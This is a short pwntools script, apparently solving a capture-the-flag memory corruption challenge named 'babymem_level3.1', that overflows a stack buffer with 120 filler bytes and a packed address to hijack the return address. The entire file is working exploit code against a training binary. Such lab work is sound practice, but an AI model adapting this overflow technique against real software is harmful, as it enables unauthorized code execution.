from pwn import *

p = process('/challenge/babymem_level3.1')

p.recvuntil('Payload size:')
p.sendline(b'128')

payload = b'a' * 120 + p64(0x402230) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

